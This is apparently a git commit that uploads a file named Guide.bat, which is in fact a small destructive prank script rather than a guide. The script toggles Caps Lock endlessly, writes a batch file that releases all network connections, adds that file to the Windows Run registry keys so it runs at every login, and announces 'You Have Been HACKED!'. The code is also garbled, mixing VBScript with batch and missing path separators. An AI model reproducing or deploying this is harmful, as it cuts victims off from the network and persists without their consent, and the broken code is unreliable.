c901d81c4d0b9f9f4f6d903e98fd390df490f3ce
RISING1337FORCE <elias_nygren@icloud.com>
2025-02-03 08:34:21 +0100

    Add files via upload

---
+++ Guide.bat
@@ -0,0 +1,15 @@
+Set wshShell =wscript.CreateObject(”WScript.Shell”)
+do
+wscript.sleep 100
+wshshell.sendkeys “{CAPSLOCK}”
+loop
+
+
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo You Have Been HACKED!
+PAUSE
